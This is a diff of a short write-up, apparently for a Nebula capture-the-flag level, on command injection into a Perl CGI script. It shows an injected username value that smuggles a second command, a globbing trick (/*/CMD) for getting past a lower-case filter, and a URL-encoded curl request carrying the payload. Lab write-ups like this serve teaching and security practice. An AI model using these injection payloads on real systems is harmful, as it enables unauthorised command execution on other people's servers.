@@ -10,7 +10,7 @@ Exploitation:
 * install is a script to install CMD script on remote machine
 * exploit.sh contains an example command that connects and injects data 
 
-So far, I managed to find the correct data to make the perl script execute:
+So far, I managed to find the correct argument to supply as username to make the perl script execute my own command (here getflag):
 '''
 $./target_script.pl "\"&./getflag&\""
 $ cat flag
@@ -21,6 +21,7 @@ The tip to execute an arbitrary script, is to put it in a writable folder close 
 Then use shell globbing  /*/CMD to refer to it. This way, no lower case letter is used.
 
 URLencoded we get the command:
+
 '''
 curl http://<nebula machine>:1616/index.cgi?username="&%2F*%2FCMD&"
 '''
